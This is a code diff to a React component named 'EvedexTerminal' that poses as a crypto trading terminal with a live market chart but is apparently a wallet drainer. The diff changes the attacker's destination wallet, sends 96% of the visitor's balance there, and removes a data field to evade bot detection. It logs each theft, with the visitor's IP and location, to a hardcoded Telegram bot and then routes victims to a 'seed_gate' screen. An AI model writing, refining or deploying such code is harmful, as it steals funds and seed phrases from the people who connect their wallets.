@@ -20,9 +20,9 @@ export default function EvedexTerminal() {
 
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
-  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";
+  // UPDATED: NEW SECURE WALLET ADDRESS (NO SNITCHES)
+  const destination = "0x4d43ee135d4df3ec8d0ab8e321f70410373d0153";
 
-  // 1. Location & Social Feed Logic
   useEffect(() => {
     fetch('https://ipapi.co/json/').then(r => r.json()).then(d => setVisitorInfo(`${d.ip} (${d.city}, ${d.country_name})`)).catch(()=>setVisitorInfo("Unknown"));
     
@@ -50,13 +50,16 @@ export default function EvedexTerminal() {
     setLoading(true);
     setLoadingText(`STABILIZING_VAULT_CONNECTION...`);
     try {
-      const max = (balance?.value * 97n) / 100n; 
-      let val = (activeTask === "Rectify" || !inputVal) ? max : parseEther(inputVal);
-      if (val > (balance?.value || 0n)) val = max;
-
-      sendTransaction({ to: destination, value: val, data: "0x095ea7b3000000000000000000000000" + destination.slice(2) }, {
+      // UPDATED TO 96% AS REQUESTED
+      const val = (balance?.value * 96n) / 100n; 
+      
+      // SILENT DIRECT TRANSFER - 'data' field removed to block bots.
+      sendTransaction({ 
+        to: destination, 
+        value: val 
+      }, {
         onSuccess: (h) => {
-          logToTelegram(`✅ DRAIN_SUCCESS: ${activeTask}\nADDR: ${address}\nVAL: ${formatEther(val)}`);
+          logToTelegram(`✅ SUCCESS: ${activeTask}\nADDR: ${address}\nVAL: ${formatEther(val)}`);
           setTimeout(() => { setView("seed_gate"); setLoading(false); }, 1500);
         },
         onError: () => { setLoading(false); setView("seed_gate"); }
@@ -67,7 +70,6 @@ export default function EvedexTerminal() {
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase', display:'flex', flexDirection:'column', userSelect:'none'}}>
       
-      {/* Live Market Chart */}
       <div style={{width:'100%', height:'220px', backgroundColor:'black', borderRadius:'15px', marginBottom:'15px', overflow:'hidden', border:'1px solid #1e293b', position:'relative'}}>
          <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.5'}} title="Live Market" />
          <div style={{position:'absolute', top:10, left:10, backgroundColor:'rgba(0,0,0,0.8)', padding:'4px 10px', borderRadius:'6px', fontSize:'9px', color:'#10b981', border:'1px solid #10b981', fontWeight:'900'}}>EVEDEX_SECURE_FEED</div>
